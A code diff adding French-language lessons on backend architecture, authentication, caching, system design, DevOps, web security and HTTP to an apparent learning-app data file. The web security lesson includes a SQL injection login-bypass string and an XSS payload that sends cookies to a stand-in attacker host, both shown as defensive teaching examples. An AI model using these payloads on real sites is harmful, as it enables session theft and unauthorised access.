@@ -2000,5 +2000,1291 @@ docker compose --profile dev up
 - Les volumes nommés persistent entre les redémarrages`
       }
     ]
+  },
+  {
+    id: "architecture-backend",
+    emoji: "🏗️",
+    title: "Architecture Backend",
+    description: "Comment fonctionne un serveur, une API, une base de données",
+    level: "Intermédiaire",
+    color: "#F59E0B",
+    lessons: [
+      {
+        id: "backend-fonctionnement",
+        title: "Comment fonctionne un backend ?",
+        duration: "12 min",
+        content: `# Comment fonctionne un backend ?
+
+Un **backend** est la partie invisible d'une application : le serveur, la logique métier et la base de données. L'utilisateur ne le voit jamais, mais c'est lui qui fait tout le travail.
+
+## L'architecture client-serveur
+
+\`\`\`
+Navigateur (client)          Serveur (backend)           Base de données
+       │                            │                            │
+       │  GET /api/articles ──────► │                            │
+       │                            │  SELECT * FROM articles ──►│
+       │                            │                   ◄─────── │ données
+       │  ◄────── JSON [{...}] ──── │                            │
+\`\`\`
+
+**Ce qui se passe en détail :**
+1. Le navigateur envoie une **requête HTTP** (GET, POST, etc.)
+2. Le serveur reçoit la requête et l'analyse
+3. Le serveur exécute la **logique métier** (vérifier les droits, calculer, etc.)
+4. Le serveur interroge la **base de données** si besoin
+5. Le serveur retourne une **réponse** (souvent du JSON)
+
+## Les couches d'un backend
+
+\`\`\`
+┌─────────────────────────────────────┐
+│           Couche Routage            │  ← Qui gère quelle URL ?
+│  GET /users → UserController        │
+├─────────────────────────────────────┤
+│         Couche Contrôleurs          │  ← Orchestration
+│  Reçoit la requête, retourne réponse│
+├─────────────────────────────────────┤
+│           Couche Services           │  ← Logique métier pure
+│  "Un user peut avoir max 5 projets" │
+├─────────────────────────────────────┤
+│          Couche Repository          │  ← Accès aux données
+│  Toutes les requêtes SQL ici        │
+├─────────────────────────────────────┤
+│        Base de données              │  ← Stockage persistant
+└─────────────────────────────────────┘
+\`\`\`
+
+## Pourquoi séparer en couches ?
+
+- **Routage** : centralise les URLs, facile à lire d'un coup d'œil
+- **Contrôleur** : ne contient QUE la gestion requête/réponse
+- **Service** : logique métier testable indépendamment du HTTP
+- **Repository** : si tu changes de base de données, tu ne touches que cette couche
+
+## Exemple concret : inscription d'un utilisateur
+
+\`\`\`
+1. POST /auth/register  →  Routeur
+2. Routeur              →  AuthController.register(requête)
+3. Controller           →  AuthService.createUser(email, password)
+4. Service              →  vérifie si email déjà utilisé
+5. Service              →  hash le mot de passe
+6. Service              →  UserRepository.save(user)
+7. Repository           →  INSERT INTO users...
+8. Remonte              →  retourne le token JWT
+\`\`\`
+
+## Synchrone vs Asynchrone
+
+**Synchrone** : le serveur attend la réponse avant de continuer → bloque tout si la DB est lente
+
+**Asynchrone** : le serveur peut gérer d'autres requêtes en attendant → indispensable pour gérer des centaines de requêtes simultanées
+
+C'est pourquoi Python/FastAPI et Node.js utilisent \`async/await\`.`
+      },
+      {
+        id: "backend-authentification",
+        title: "Authentification et sessions",
+        duration: "14 min",
+        content: `# Authentification et sessions
+
+L'authentification répond à : **"Qui est cet utilisateur ?"**
+L'autorisation répond à : **"A-t-il le droit de faire ça ?"**
+
+## Les 3 grandes approches
+
+### 1. Sessions (approche classique)
+
+\`\`\`
+Login → POST /login (email+mdp)
+Serveur vérifie → crée session "abc123" en DB
+Réponse → Set-Cookie: sid=abc123
+
+Requête suivante → Cookie: sid=abc123
+Serveur cherche la session en DB → valide → OK
+\`\`\`
+
+**Avantages** : révocation instantanée
+**Inconvénients** : le serveur doit stocker les sessions (problème en multi-serveurs)
+
+### 2. JWT — JSON Web Tokens (approche moderne)
+
+\`\`\`
+Login → serveur crée un token signé :
+{ userId: 42, exp: demain }  →  signé avec une clé secrète
+
+Requête suivante → Authorization: Bearer {token}
+Serveur vérifie la signature → pas besoin de DB !
+\`\`\`
+
+**Structure d'un JWT** : 3 parties séparées par des points
+\`\`\`
+header.payload.signature
+eyJhbGci...  .eyJ1c2VySWQiOjQyfQ  .SflKxwRJ...
+(algo)         (données, lisible)    (vérifie intégrité)
+\`\`\`
+
+**Avantages** : sans état, multi-serveurs, mobile-friendly
+**Inconvénients** : impossible de révoquer avant expiration → utiliser une courte durée (1h) + refresh token
+
+### 3. OAuth2 / "Se connecter avec Google"
+
+\`\`\`
+Ton app → redirige vers Google
+Google → user se connecte → retourne un code
+Ton serveur échange le code contre un token Google
+→ récupère email/profil → crée session dans ton app
+\`\`\`
+
+## Hachage des mots de passe
+
+\`\`\`
+❌ JAMAIS stocker en clair : "motdepasse123"
+❌ JAMAIS MD5/SHA1 (trop rapides, attaquables)
+
+✅ bcrypt/argon2 :
+"motdepasse123"  →  bcrypt  →  "$2b$12$xyz..."  ← stocké en DB
+
+bcrypt est VOLONTAIREMENT lent (pour ralentir les attaques brute-force)
+\`\`\`
+
+## Bonnes pratiques
+
+- Tokens JWT : expiration courte (1h) + refresh token longue durée
+- HTTPS obligatoire (jamais HTTP en prod)
+- Rate limiting sur les endpoints de login (anti-brute force)
+- Ne jamais logger les mots de passe ou tokens`
+      },
+      {
+        id: "backend-cache",
+        title: "Cache et performance",
+        duration: "12 min",
+        content: `# Cache et performance
+
+Le cache est une copie temporaire des données pour éviter de recalculer ou requêter la DB à chaque fois.
+
+## Pourquoi cacher ?
+
+\`\`\`
+Sans cache :
+100 users demandent la page d'accueil
+→ 100 requêtes SQL identiques "SELECT top articles..."
+→ DB surchargée, réponse lente
+
+Avec cache (Redis) :
+1er user → requête SQL → résultat stocké en cache
+99 autres → lu depuis le cache → réponse en 1ms, DB tranquille
+\`\`\`
+
+## Les niveaux de cache
+
+\`\`\`
+1. Cache navigateur   → Headers HTTP (Cache-Control, ETag)
+                        Ressources statiques (images, CSS, JS)
+
+2. CDN                → Cache géographiquement distribué
+                        Cloudflare, AWS CloudFront
+
+3. Cache applicatif   → Redis, Memcached
+                        Résultats de requêtes DB, calculs coûteux
+
+4. Cache DB           → Buffer pool (PostgreSQL, MySQL)
+                        Données fréquentes en RAM
+\`\`\`
+
+## Redis : le cache le plus répandu
+
+Redis stocke les données **en RAM** → lecture en < 1ms
+
+\`\`\`
+Stratégie Cache-Aside :
+
+1. Requête arrive : "articles populaires ?"
+2. Redis → MISS (pas encore en cache)
+3. Requête SQL → résultat
+4. Stocke dans Redis, TTL = 5 minutes
+5. Prochaine requête → HIT → depuis Redis directement
+\`\`\`
+
+## Le problème de l'invalidation
+
+> "Il y a deux problèmes difficiles en informatique : nommer les choses et invalider le cache."
+
+Si tu modifies des données, tu dois mettre à jour ou supprimer le cache correspondant, sinon les utilisateurs voient des données obsolètes.
+
+\`\`\`
+Solutions :
+1. TTL court  →  incohérence maximale de X secondes
+2. Invalidation manuelle  →  plus complexe mais précis
+3. Write-through  →  met à jour le cache ET la DB simultanément
+\`\`\`
+
+## Indicateurs à surveiller
+
+- **Hit rate** : % de requêtes depuis le cache (objectif > 90%)
+- **Latence P99** : 99% des requêtes sous X ms
+- **Éviction** : données supprimées du cache par manque de mémoire`
+      }
+    ]
+  },
+  {
+    id: "conception-systeme",
+    emoji: "🎨",
+    title: "Conception Système",
+    description: "Concevoir des systèmes scalables et robustes",
+    level: "Avancé",
+    color: "#8B5CF6",
+    lessons: [
+      {
+        id: "scalabilite",
+        title: "Scalabilité : comment gérer la croissance",
+        duration: "15 min",
+        content: `# Scalabilité
+
+La scalabilité est la capacité d'un système à gérer une charge croissante.
+
+## Scaling vertical vs horizontal
+
+\`\`\`
+Vertical (Scale Up)              Horizontal (Scale Out)
+───────────────────              ──────────────────────
+[Serveur très puissant]          [S1] [S2] [S3] [S4]
+CPU: 64 cœurs, RAM: 256 Go            ↑
+→ Simple mais limité             Load Balancer
+→ Point de défaillance unique    → Illimité mais complexe
+                                 → Résilient (si S1 tombe, S2-4 OK)
+\`\`\`
+
+**En pratique** : on commence par le vertical (simple), puis horizontal quand nécessaire.
+
+## Le Load Balancer
+
+Distribue le trafic entre plusieurs serveurs.
+
+\`\`\`
+Internet → [Load Balancer] → [S1] [S2] [S3]
+
+Algorithmes :
+- Round Robin     : S1 → S2 → S3 → S1...
+- Least Conn      : vers le moins chargé
+- IP Hash         : même client → même serveur
+\`\`\`
+
+## Le problème de l'état partagé
+
+\`\`\`
+❌ Problème :
+Client → Serveur 1 (login, session sur S1)
+Client → Serveur 2 (pas de session → déconnecté !)
+
+✅ Solutions :
+1. Sessions dans Redis (partagé entre tous les serveurs)
+2. JWT (token sans état, chaque serveur valide)
+3. Sticky sessions (même client → même serveur)
+\`\`\`
+
+## La base de données : le goulot d'étranglement
+
+\`\`\`
+Read Replicas :
+Primary DB (écritures)
+    │ réplication
+    ├── Replica 1 (lectures)
+    └── Replica 2 (lectures)
+
+→ Divise la charge de lecture par le nombre de replicas
+\`\`\`
+
+## Les nombres à connaître
+
+\`\`\`
+Opération                     Temps approx.
+──────────────────────────    ─────────────
+Accès RAM                     ~100 ns
+Lecture Redis (réseau local)  ~1 ms
+Requête DB simple (indexée)   ~5 ms
+Requête DB complexe           ~100 ms
+Appel API externe             ~200-500 ms
+\`\`\`
+
+Ces chiffres guident tes décisions : 50 requêtes DB pour une page = problème.`
+      },
+      {
+        id: "microservices",
+        title: "Monolithe vs Microservices",
+        duration: "14 min",
+        content: `# Monolithe vs Microservices
+
+## Le monolithe
+
+Une seule application qui contient tout.
+
+\`\`\`
+┌─────────────────────────────────────┐
+│         Application Monolithe        │
+│  [Auth] [Articles] [Paiement] [Mail] │
+└──────────────────┬──────────────────┘
+              [1 seule DB]
+\`\`\`
+
+**Avantages :**
+- Simple à développer et déployer au début
+- Pas de latence réseau entre modules
+- Débogage facile
+- Transactions DB simples
+
+**Inconvénients :**
+- Un bug peut faire tomber TOUT le système
+- Difficile de scaler un seul module
+- Déploiement = tout redéployer
+
+## Les microservices
+
+Chaque fonctionnalité est un service indépendant.
+
+\`\`\`
+[API Gateway]
+     │
+     ├── [Service Auth] → DB1
+     ├── [Service Posts] → DB2
+     ├── [Service Paiement] → DB3
+     └── [Service Emails] → Queue
+\`\`\`
+
+**Avantages :**
+- Chaque service déployable indépendamment
+- Scaler uniquement ce qui est sous charge
+- Une panne isole un seul service
+
+**Inconvénients :**
+- Complexité opérationnelle élevée
+- Latence réseau entre services
+- Transactions distribuées très complexes
+- Nécessite du DevOps mature (Kubernetes...)
+
+## La règle d'or : commencer par le monolithe
+
+\`\`\`
+Startup → Monolithe (simple, rapide à itérer)
+Croissance → Monolithe modulaire (modules bien séparés)
+Grande échelle → Microservices (si vraiment nécessaire)
+
+Netflix, Uber : microservices (des millions d'users)
+La plupart des apps : monolithe suffisant
+\`\`\`
+
+## Communication entre services
+
+\`\`\`
+Synchrone (HTTP/gRPC) :
+Service A → Service B (attend réponse)
+→ Pour : actions qui nécessitent une réponse immédiate
+
+Asynchrone (Message Queue) :
+Service A → Queue → Service B (traite quand libre)
+→ Pour : emails, notifications, traitements longs
+\`\`\``
+      },
+      {
+        id: "conception-bdd",
+        title: "Concevoir une base de données",
+        duration: "14 min",
+        content: `# Concevoir une base de données
+
+La conception de la DB est l'une des décisions les plus importantes. Mal conçue, elle freine tout le développement.
+
+## Pas de redondance
+
+\`\`\`
+❌ Mauvais : même info répétée
+commandes : | id | client_email | client_ville |
+            | 1  | alice@ex.com | Paris        |
+            | 2  | alice@ex.com | Paris        |  ← Paris répété
+            | 3  | alice@ex.com | Paris        |  ← Si Alice déménage ?
+
+✅ Correct : séparer en tables
+commandes(id, client_id, ...)
+clients(id, email, ville, ...)
+\`\`\`
+
+## Les relations
+
+\`\`\`
+1-à-1 :  Un user a un profil
+         users.id ──── profils.user_id
+
+1-à-N :  Un user a N commandes
+         users.id ──┬─ commandes.user_id
+                    ├─ commandes.user_id
+                    └─ commandes.user_id
+
+N-à-N :  Un article a N tags, un tag a N articles
+         articles ──── articles_tags (table de jonction) ──── tags
+\`\`\`
+
+## SQL vs NoSQL
+
+\`\`\`
+SQL (PostgreSQL, MySQL)            NoSQL (MongoDB, Redis...)
+──────────────────────             ──────────────────────────
+✅ Données structurées             ✅ Données variables / flexibles
+✅ Transactions ACID               ✅ Grande échelle horizontale
+✅ Requêtes complexes (JOINs)      ✅ Lecture/écriture ultra rapide
+✅ 99% des applis web              ✅ Logs, cache, sessions, analytics
+
+Règle : commence par PostgreSQL.
+Passe à NoSQL uniquement si tu as un besoin spécifique.
+\`\`\`
+
+## Index : la clé de la performance
+
+\`\`\`
+Sans index :           Avec index :
+Chercher par email     Chercher par email
+→ Scan toute la table  → Cherche dans l'arbre B
+→ 1M lignes = lent     → ~20 comparaisons
+   O(n)                   O(log n)
+
+Quand indexer :
+✅ Colonnes dans les WHERE fréquents
+✅ Colonnes dans les JOIN
+✅ Colonnes dans les ORDER BY
+
+Quand NE PAS indexer :
+❌ Colonnes rarement filtrées
+❌ Tables très petites
+❌ Booléens (trop peu de valeurs distinctes)
+\`\`\``
+      }
+    ]
+  },
+  {
+    id: "devops",
+    emoji: "🚀",
+    title: "DevOps",
+    description: "CI/CD, déploiement, monitoring et infrastructure",
+    level: "Intermédiaire",
+    color: "#10B981",
+    lessons: [
+      {
+        id: "devops-cicd",
+        title: "CI/CD : automatiser les déploiements",
+        duration: "14 min",
+        content: `# CI/CD : automatiser les déploiements
+
+**CI** (Continuous Integration) = vérifier automatiquement chaque modification de code
+**CD** (Continuous Delivery/Deployment) = déployer automatiquement en production
+
+## Sans CI/CD (le chaos)
+
+\`\`\`
+Dev A commit → "ça marche sur ma machine"
+Dev B commit → "ça marche sur ma machine"
+Merge → 💥 Le serveur de prod plante
+→ 3h pour trouver le bug, rollback manuel, stress dans l'équipe
+\`\`\`
+
+## Avec CI/CD
+
+\`\`\`
+Dev commit → GitHub → Pipeline automatique :
+  1. Tests unitaires              (~2 min)
+  2. Tests d'intégration          (~5 min)
+  3. Analyse de sécurité          (~2 min)
+  4. Build de l'application       (~3 min)
+  5. Déploiement en staging       (~2 min)
+  6. Tests end-to-end             (~5 min)
+  7. ✅ Déploiement en production (~1 min)
+
+Si une étape échoue → pipeline arrêté, notification au dev
+\`\`\`
+
+## Un pipeline GitHub Actions
+
+\`\`\`yaml
+name: CI/CD
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - run: pip install -r requirements.txt
+      - run: pytest tests/ -v
+
+  deploy:
+    needs: test   # ← déploie SEULEMENT si les tests passent
+    if: github.ref == 'refs/heads/main'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Déployer
+        run: curl -X POST \${{ secrets.RENDER_DEPLOY_HOOK }}
+\`\`\`
+
+## Les environnements
+
+\`\`\`
+Développement      Staging (recette)      Production
+─────────────      ─────────────────      ──────────
+Poste du dev       Copie de la prod       Users réels
+Données de test    Tests finaux ici       Stabilité max
+
+Flux : dev → commit → tests CI → staging → validation → prod
+\`\`\`
+
+## Les stratégies de déploiement
+
+\`\`\`
+Blue-Green :
+Prod actuelle (Blue v1.0) ← tout le trafic
+Nouvelle (Green v1.1) déployée en parallèle
+→ Bascule le trafic vers Green
+→ Problème ? Rebascule vers Blue instantanément
+
+Canary :
+v1.0 ← 90% du trafic
+v1.1 ← 10% du trafic ("cobayes")
+→ Surveille les métriques → augmente progressivement
+\`\`\`
+
+## Bonnes pratiques
+
+- Automatise TOUT : build, tests, déploiement
+- Ne jamais déployer manuellement en prod
+- Toujours avoir un rollback rapide (< 5 min)`
+      },
+      {
+        id: "devops-monitoring",
+        title: "Monitoring et observabilité",
+        duration: "12 min",
+        content: `# Monitoring et observabilité
+
+Sans monitoring, tu découvres les pannes quand les utilisateurs se plaignent.
+
+## Les 3 piliers
+
+\`\`\`
+1. MÉTRIQUES
+   Données numériques dans le temps
+   → CPU: 45%, RAM: 2.3 Go, req/sec: 1200
+   → Outil : Prometheus + Grafana
+
+2. LOGS
+   Événements textuels horodatés
+   → "2024-01-15 14:23 ERROR DB connection failed"
+   → Outil : ELK Stack, Loki, Datadog
+
+3. TRACES
+   Suivi d'une requête à travers tous les services
+   → Requête → Auth (12ms) → Users (45ms) → DB (8ms) = 65ms total
+   → Outil : Jaeger, Zipkin
+\`\`\`
+
+## Les métriques essentielles
+
+\`\`\`
+Infrastructure :
+- CPU usage       → > 80% = problème
+- Memory usage    → > 90% = critique
+- Disk usage      → > 85% = alerte
+
+Application :
+- Request rate    → requêtes/seconde
+- Error rate      → % de réponses 5xx (objectif < 0.1%)
+- Latence P50/P95/P99
+
+Base de données :
+- Query duration  → requêtes lentes (> 1s = problème)
+- Connection pool → nb de connexions actives
+\`\`\`
+
+## Les SLOs (Service Level Objectives)
+
+\`\`\`
+Disponibilité :
+99%     = 3.65 jours de downtime/an    (startup)
+99.9%   = 8.7 heures de downtime/an   (standard)
+99.99%  = 52 minutes de downtime/an   (e-commerce, SaaS)
+99.999% = 5 minutes de downtime/an    (bancaire, médical)
+
+Latence :
+P50 < 100ms  (la moitié des requêtes)
+P95 < 500ms  (95% des requêtes)
+P99 < 2s     (99% des requêtes)
+\`\`\`
+
+## Bons logs vs mauvais logs
+
+\`\`\`
+✅ Bon log :
+{
+  "timestamp": "2024-01-15T14:23:01Z",
+  "level": "ERROR",
+  "service": "auth",
+  "user_id": 42,
+  "error": "DB timeout after 5000ms",
+  "request_id": "req-789xyz"
+}
+
+❌ Mauvais logs :
+"Error occurred"        ← aucune info
+"user logged in"        ← qui ? quand ?
+"password=secret123"    ← NE JAMAIS logger les données sensibles
+\`\`\``
+      },
+      {
+        id: "devops-infrastructure",
+        title: "Infrastructure et Cloud",
+        duration: "13 min",
+        content: `# Infrastructure et Cloud
+
+## Les modèles de déploiement
+
+\`\`\`
+On-Premise          IaaS                 PaaS              SaaS
+(ton serveur)       (VM dans le cloud)   (plateforme gérée) (logiciel)
+────────────        ──────────────────   ─────────────────  ─────────
+Tu gères TOUT       Tu gères l'OS        Tu gères ton app  Tu utilises
+                    et ton app           le reste est géré
+
+Ex : serveur perso  AWS EC2, GCP VMs     Heroku, Render,    Gmail, Slack
+                                         Vercel, Railway
+\`\`\`
+
+## Services Cloud essentiels (AWS)
+
+\`\`\`
+Calcul :
+  EC2       → Machines virtuelles
+  Lambda    → Fonctions serverless (payer à l'usage)
+  ECS/EKS   → Conteneurs Docker orchestrés
+
+Stockage :
+  S3        → Fichiers (images, vidéos, backups)
+  RDS       → Base de données gérée (PostgreSQL, MySQL)
+  ElastiCache → Redis/Memcached géré
+
+Réseau :
+  Route 53  → DNS
+  CloudFront → CDN mondial
+  API Gateway → Proxy pour tes APIs
+
+Sécurité :
+  IAM       → Gestion des accès et permissions
+  ACM       → Certificats SSL gratuits
+\`\`\`
+
+## Serverless
+
+\`\`\`
+Serveur traditionnel :          Serverless (Lambda, Vercel Functions) :
+──────────────────────          ──────────────────────────────────────
+Tourne 24h/24                   S'exécute à la demande
+Tu paies le serveur idle        Tu paies par exécution (souvent gratuit)
+Tu gères OS, updates            Le provider gère tout
+Scale manuel                    Scale automatique
+
+Limites serverless :
+- Cold start (~200ms pour la première invocation)
+- Pas d'état persistant entre les appels
+- Timeout limité (15min sur Lambda)
+\`\`\`
+
+## Infrastructure as Code (IaC)
+
+Définir l'infrastructure comme du code, versionnable et reproductible.
+
+\`\`\`hcl
+# Terraform : créer une instance + DB en quelques lignes
+resource "aws_instance" "web" {
+  ami           = "ami-0c55b159cbfafe1f0"
+  instance_type = "t3.micro"
+}
+
+resource "aws_db_instance" "db" {
+  engine         = "postgres"
+  instance_class = "db.t3.micro"
+}
+\`\`\`
+
+**Avantages :**
+- Reproductible (recréer l'infra en 5 min)
+- Versionné dans Git (historique des changements)
+- Évite les erreurs de configuration manuelle`
+      }
+    ]
+  },
+  {
+    id: "securite-web",
+    emoji: "🔐",
+    title: "Sécurité Web",
+    description: "Comprendre et prévenir les attaques courantes",
+    level: "Intermédiaire",
+    color: "#EF4444",
+    lessons: [
+      {
+        id: "owasp-top10",
+        title: "Les vulnérabilités les plus courantes",
+        duration: "15 min",
+        content: `# Les vulnérabilités les plus courantes (OWASP Top 10)
+
+## 1. Injection SQL
+
+L'attaquant insère du SQL dans une entrée utilisateur pour manipuler la DB.
+
+\`\`\`sql
+-- URL : /login?email=admin'--&password=nimportequoi
+
+-- Requête construite (VULNÉRABLE) :
+SELECT * FROM users WHERE email='admin'--' AND password='...'
+-- '--' commente tout ce qui suit → contourne le mot de passe !
+
+-- ✅ Protection : requêtes préparées
+SELECT * FROM users WHERE email = $1 AND password = $2
+-- Les paramètres sont échappés automatiquement
+\`\`\`
+
+## 2. XSS (Cross-Site Scripting)
+
+L'attaquant injecte du JavaScript malveillant dans une page.
+
+\`\`\`
+Attaquant soumet dans un commentaire :
+<script>document.location='evil.com?c='+document.cookie</script>
+
+Ce script s'exécute chez tous les visiteurs → vol de cookies/sessions
+
+✅ Protection :
+- Jamais : element.innerHTML = userInput
+- Toujours : element.textContent = userInput
+- Échapper l'HTML avant affichage
+\`\`\`
+
+## 3. Authentification cassée
+
+\`\`\`
+❌ Problèmes courants :
+- Mots de passe stockés en clair ou MD5/SHA1
+- Pas de rate limiting sur le login → brute force possible
+- Sessions qui n'expirent jamais
+- Tokens JWT avec algorithme "none" accepté
+
+✅ Solutions :
+- bcrypt/argon2 pour les mots de passe
+- Rate limiting : max 5 tentatives, puis blocage
+- Expiration des tokens (1h access, 7j refresh)
+\`\`\`
+
+## 4. Exposition de données sensibles
+
+\`\`\`
+❌ Problèmes courants :
+- API retourne le hash du mdp dans l'objet user
+- Clés API dans le code source (pushées sur GitHub)
+- Connexion DB sans SSL
+- Logs qui contiennent des mots de passe
+
+✅ Solutions :
+- Retourner uniquement les champs nécessaires
+- Variables d'environnement pour les secrets
+- HTTPS partout, SSL pour les connexions DB
+\`\`\`
+
+## 5. IDOR (Broken Access Control)
+
+\`\`\`
+GET /api/factures/1234
+→ Retourne la facture 1234
+
+Si l'API ne vérifie pas que cette facture appartient
+à l'utilisateur connecté → n'importe qui peut voir
+les factures des autres en changeant l'ID !
+
+✅ Protection :
+- Toujours vérifier : "cette ressource appartient-elle à cet user ?"
+- Utiliser des UUIDs plutôt que des IDs numériques séquentiels
+\`\`\`
+
+## 6. Mauvaise configuration
+
+\`\`\`
+❌ Problèmes courants :
+- Mode debug en production (expose les stack traces)
+- Identifiants par défaut non changés (admin/admin)
+- CORS trop permissif (allow *)
+- Headers de sécurité manquants
+
+✅ Headers essentiels :
+Content-Security-Policy: default-src 'self'
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000
+\`\`\`
+
+## Règle d'or
+
+> **Ne jamais faire confiance aux données venant du client.**
+
+Valide et assainis TOUJOURS les entrées côté serveur, même si tu as une validation côté frontend.`
+      },
+      {
+        id: "securite-secrets",
+        title: "Gestion des secrets et HTTPS",
+        duration: "12 min",
+        content: `# Gestion des secrets et HTTPS
+
+## HTTP vs HTTPS
+
+\`\`\`
+HTTP (non chiffré) :
+Navigateur ──── "password=secret123" ────► Serveur
+           ← lisible par quiconque intercepte le trafic →
+
+HTTPS (chiffré avec TLS) :
+Navigateur ──── "Xk9#mP2$nQ..." (chiffré) ────► Serveur
+           ← incompréhensible même si intercepté →
+\`\`\`
+
+## Comment fonctionne TLS
+
+\`\`\`
+1. Client envoie "Bonjour, je supporte TLS 1.3"
+2. Serveur envoie son certificat (clé publique + identité)
+   "Je suis bien github.com, signé par Let's Encrypt"
+3. Client vérifie le certificat via une Autorité de Certification
+4. Échange de clé de session (chiffrée avec la clé publique)
+5. Communication chiffrée avec la clé de session
+\`\`\`
+
+## Les certificats SSL/TLS
+
+\`\`\`
+Qui délivre ? → Autorités de Certification (CA)
+               Let's Encrypt (gratuit), DigiCert, Comodo...
+
+Types :
+DV (Domain Validation)   → vérifie que tu contrôles le domaine
+                           Gratuit avec Let's Encrypt, suffisant pour 99%
+OV (Organization Valid.) → vérifie aussi l'organisation
+EV (Extended Valid.)     → vérification poussée, banques
+
+Let's Encrypt :
+→ Gratuit, automatique, renouvelé tous les 90 jours
+→ Supporté par Certbot, Caddy, Vercel, Render...
+→ Aucune raison de ne pas avoir HTTPS aujourd'hui
+\`\`\`
+
+## Gestion des secrets
+
+\`\`\`
+❌ NE JAMAIS faire :
+API_KEY = "sk-abc123..."  ← dans le code source
+git push origin main      ← maintenant la clé est sur GitHub, pour toujours
+                            (même si tu la supprimes, elle reste dans l'historique)
+
+✅ TOUJOURS faire :
+API_KEY = os.getenv("API_KEY")    ← variable d'environnement
+
+Outils :
+- .env (local uniquement, dans .gitignore)
+- Variables d'environnement du serveur (Render, Vercel, etc.)
+- GitHub Secrets (pour les CI/CD)
+- HashiCorp Vault, AWS Secrets Manager (entreprises)
+
+Si tu as accidentellement pushé une clé :
+1. Révoque-la IMMÉDIATEMENT chez le provider
+2. Génères-en une nouvelle
+3. Ne te contente pas de supprimer le commit
+\`\`\`
+
+## CORS : contrôler qui peut appeler ton API
+
+\`\`\`
+CORS (Cross-Origin Resource Sharing) :
+→ Le navigateur bloque par défaut les requêtes vers un autre domaine
+→ Le serveur doit explicitement autoriser les domaines clients
+
+❌ Trop permissif :
+Access-Control-Allow-Origin: *    ← tout le monde peut appeler ton API
+
+✅ Correct :
+Access-Control-Allow-Origin: https://monapp.com
+Access-Control-Allow-Credentials: true  ← avec cookies/tokens
+\`\`\``
+      }
+    ]
+  },
+  {
+    id: "reseaux-http",
+    emoji: "🌍",
+    title: "Réseaux & HTTP",
+    description: "Comment Internet fonctionne vraiment",
+    level: "Intermédiaire",
+    color: "#06B6D4",
+    lessons: [
+      {
+        id: "internet-fonctionnement",
+        title: "Comment fonctionne Internet",
+        duration: "12 min",
+        content: `# Comment fonctionne Internet
+
+## Quand tu tapes une URL dans ton navigateur
+
+\`\`\`
+Tu tapes : https://github.com/mon-projet
+
+Étape 1 — Résolution DNS
+→ "C'est quoi l'IP de github.com ?"
+→ Cache local → DNS de ton FAI → DNS Racine → DNS .com → DNS GitHub
+→ Réponse : "140.82.121.4"
+
+Étape 2 — Connexion TCP (3-way handshake)
+Navigateur → SYN ──────────► Serveur
+Navigateur ◄── SYN-ACK ───── Serveur
+Navigateur → ACK ──────────► Serveur
+(~30ms)
+
+Étape 3 — Handshake TLS (HTTPS)
+→ 2 allers-retours pour établir le chiffrement
+
+Étape 4 — Requête HTTP
+GET /mon-projet HTTP/2
+Host: github.com
+
+Étape 5 — Réponse
+HTTP/2 200 OK → HTML de la page
+
+Étape 6 — Rendu
+→ Parser HTML → découvrir CSS, JS, images
+→ Requêtes parallèles → DOM → affichage
+\`\`\`
+
+## TCP : la livraison garantie
+
+\`\`\`
+Les données sont découpées en paquets :
+"Bonjour le monde !" → [Paquet 1: "Bonjour "] [Paquet 2: "le monde !"]
+
+Chaque paquet peut prendre un chemin différent sur Internet !
+TCP les réassemble dans le bon ordre à l'arrivée.
+TCP garantit la livraison (retransmet si paquet perdu).
+
+UDP (alternative) : pas de garantie, mais plus rapide
+→ Streaming vidéo, jeux en ligne (mieux perdre un paquet que d'attendre)
+\`\`\`
+
+## DNS : l'annuaire d'Internet
+
+\`\`\`
+Types d'enregistrements :
+A     : nom → IPv4          github.com → 140.82.121.4
+AAAA  : nom → IPv6
+CNAME : alias               www.github.com → github.com
+MX    : serveur email       github.com → aspmx.l.google.com
+TXT   : vérification de domaine, SPF, DKIM...
+
+Propagation :
+Quand tu changes un DNS → jusqu'à 48h pour propager
+(TTL = durée de cache, souvent 3600s = 1h)
+\`\`\`
+
+## Latence : l'ennemi invisible
+
+\`\`\`
+Paris → Serveur à Paris       :  ~5 ms
+Paris → Serveur à Londres     : ~15 ms
+Paris → Serveur à New York    : ~80 ms
+Paris → Serveur à Tokyo       : ~250 ms
+
+→ Pourquoi les CDN existent : rapprocher les serveurs des utilisateurs
+→ Cloudflare, AWS CloudFront, Fastly...
+\`\`\``
+      },
+      {
+        id: "http-protocole",
+        title: "HTTP en profondeur",
+        duration: "13 min",
+        content: `# HTTP en profondeur
+
+## Anatomie d'une requête
+
+\`\`\`
+POST /api/articles HTTP/1.1        ← ligne de requête (méthode + URL + version)
+Host: api.monsite.com              ←
+Content-Type: application/json       headers
+Authorization: Bearer eyJhbGci...  ←
+
+{                                  ← corps (body)
+  "titre": "Mon article"
+}
+\`\`\`
+
+## Anatomie d'une réponse
+
+\`\`\`
+HTTP/1.1 201 Created               ← status code
+Content-Type: application/json     ← headers
+Location: /api/articles/42
+
+{                                  ← corps
+  "id": 42,
+  "titre": "Mon article"
+}
+\`\`\`
+
+## Headers importants
+
+\`\`\`
+Requête :
+Content-Type: application/json     → format du body envoyé
+Authorization: Bearer {token}      → authentification
+Cookie: session=abc123             → cookies
+
+Réponse :
+Content-Type: text/html; charset=utf-8   → format retourné
+Cache-Control: max-age=3600              → mise en cache 1h
+Set-Cookie: session=abc; HttpOnly        → créer un cookie sécurisé
+X-Rate-Limit-Remaining: 45             → requêtes restantes
+\`\`\`
+
+## HTTP/1.1 vs HTTP/2 vs HTTP/3
+
+\`\`\`
+HTTP/1.1 (1997) :
+→ Une requête à la fois par connexion
+→ Head-of-line blocking : une requête lente bloque les autres
+
+HTTP/2 (2015) :
+→ Multiplexage : plusieurs requêtes en parallèle sur 1 connexion
+→ Compression des headers
+→ Utilisé par ~65% du web
+
+HTTP/3 (2022) :
+→ Basé sur UDP (via QUIC) au lieu de TCP
+→ Meilleure gestion de la perte de paquets
+→ Connexion plus rapide
+\`\`\`
+
+## WebSockets : communication bidirectionnelle
+
+\`\`\`
+HTTP classique :
+Client → requête → Serveur → réponse
+→ Le serveur ne peut PAS initier de communication
+
+WebSocket :
+Client ↔ Serveur : messages en temps réel dans les deux sens
+→ Chat, notifications live, collaboration, jeux
+
+wss:// = WebSocket sécurisé (comme HTTPS pour le HTTP)
+\`\`\`
+
+## SSE : Server-Sent Events
+
